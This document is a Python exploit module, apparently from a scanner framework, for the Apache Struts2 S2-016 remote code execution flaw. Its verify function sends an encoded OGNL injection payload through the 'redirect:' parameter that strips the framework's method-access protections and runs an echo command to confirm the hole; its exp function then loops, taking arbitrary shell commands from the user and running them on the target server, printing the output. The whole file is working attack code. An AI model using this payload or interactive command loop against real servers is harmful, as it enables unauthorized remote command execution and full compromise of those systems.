import requests
import re
import urllib


def verify(url):
    relsult = {
        'name': 'S2-016 Remote Code Execution Vulnerability',
        'vulnerable': False
    }
    try:
        flag = 'dqub23akjj21sd2kx75xa123f'
        cmd_shell = 'echo+' + flag
        payload = r'?redirect:%24%7b%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2c%23f.setAccessible(true)%2c%23f.set(%23_memberAccess%2ctrue)%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%22{0}%22).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew+java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b5000%5d%2c%23c.read(%23d)%2c%23genxor%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2c%23genxor.println(%23d)%2c%23genxor.flush()%2c%23genxor.close()%7d'
        payload1 = payload.format(cmd_shell)
        payload2 = payload.format(flag)
        vulurl1 = urllib.parse.urljoin(url, payload1)
        vulurl2 = urllib.parse.urljoin(url, payload2)
        req1 = requests.get(vulurl1, timeout=3)
        req2 = requests.get(vulurl2, timeout=3)
        if re.search(flag, req1.text):
            if re.search(flag, req2.text) and len(req2.text) < len(req1.text):
                pass
            else:
                relsult['vulnerable'] = True
                relsult['method'] = 'GET'
                relsult['url'] = url
                relsult['payload'] = vulurl1
                relsult['exp'] = True
        return relsult
    except:
        return relsult

def exp(url):
    if verify(url)['vulnerable']:
        while True:
            cmd_shell = input('执行命令:')
            cmd_shell = urllib.parse.quote(cmd_shell)
            payload = r'?redirect:%24%7b%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2c%23f.setAccessible(true)%2c%23f.set(%23_memberAccess%2ctrue)%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%22{0}%22).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew+java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b5000%5d%2c%23c.read(%23d)%2c%23genxor%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2c%23genxor.println(%23d)%2c%23genxor.flush()%2c%23genxor.close()%7d'
            payload = payload.format(cmd_shell)
            vulurl = urllib.parse.urljoin(url, payload)
            req = requests.get(vulurl, timeout=3)
            print(req.text)


